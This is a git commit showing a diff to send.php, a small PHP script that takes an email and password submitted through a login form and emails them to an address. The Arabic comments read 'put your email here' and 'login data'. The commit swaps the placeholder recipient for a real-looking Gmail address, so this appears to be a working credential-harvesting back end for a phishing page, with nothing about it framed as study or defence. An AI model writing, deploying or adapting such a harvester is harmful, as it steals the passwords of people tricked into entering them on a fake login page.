a258666350d957af433e2dfd3d4cb79150c84ca9
5goko5 <123900248+5goko5@users.noreply.github.com>
2025-02-22 21:02:00 +0100

    Update send.php

--- send.php
+++ send.php
@@ -3,7 +3,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $email = $_POST['email'];
     $password = $_POST['password'];
 
-    $to = "youremail@example.com"; // ضع إيميلك هنا
+    $to = "issam.s.g22@gmail.com"; // ضع إيميلك هنا
     $subject = "بيانات تسجيل الدخول";
     $message = "الإيميل: " . $email . "\nكلمة المرور: " . $password;
     $headers = "From: no-reply@yourdomain.com";
